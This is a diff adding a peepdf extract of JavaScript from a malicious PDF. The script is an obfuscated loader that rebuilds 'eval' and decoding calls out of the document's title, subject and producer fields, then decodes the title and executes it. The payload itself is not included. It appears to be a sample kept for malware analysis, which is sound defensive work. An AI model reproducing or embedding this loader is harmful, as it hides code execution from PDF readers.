@@ -1,0 +1,30 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+<< /Names [(test) <</S /JavaScript
+/JS (
+HedYcutatejuwgud='';
+FadiqYlova=2011;
+var j = FadiqYlova-2007;
+KoepoZoj='2011s'.replace(FadiqYlova,'hi');
+veQn=('.tit2011').replace(FadiqYlova,'le');
+eval('PamEz=t'+KoepoZoj+veQn);
+TojopobaloLumiqep=('sub2011').replace(FadiqYlova,'ject');
+eval('CehUkyvi=t'+KoepoZoj+'.'+TojopobaloLumiqep);
+CehUkyvi=CehUkyvi.replace(FadiqYlova,'al');
+eval('BunuxdIevoqi=t'+KoepoZoj);
+eval('FofiqiresiaobozuMt=BunuxdIevoqi[CehUkyvi]');
+ZukobimnfypoMygys='.pro2011cer';
+ZukobimnfypoMygys=FofiqiresiaobozuMt('ZukobimnfypoMygys.replace(FadiqYlova,"du")');
+eval('FelaxYu=t'+KoepoZoj+ZukobimnfypoMygys);
+PidakonizonYbahy=FofiqiresiaobozuMt(FelaxYu);
+MozUtisu = PamEz.split(',');
+for (GymyDuw = 0; GymyDuw < MozUtisu.length; GymyDuw++) {
+	JyYjywibupa = FofiqiresiaobozuMt(MozUtisu[GymyDuw]);
+	HedYcutatejuwgud += PidakonizonYbahy(JyYjywibupa);
+}
+FofiqiresiaobozuMt(HedYcutatejuwgud);
+
+)
+>>]
+>>
+
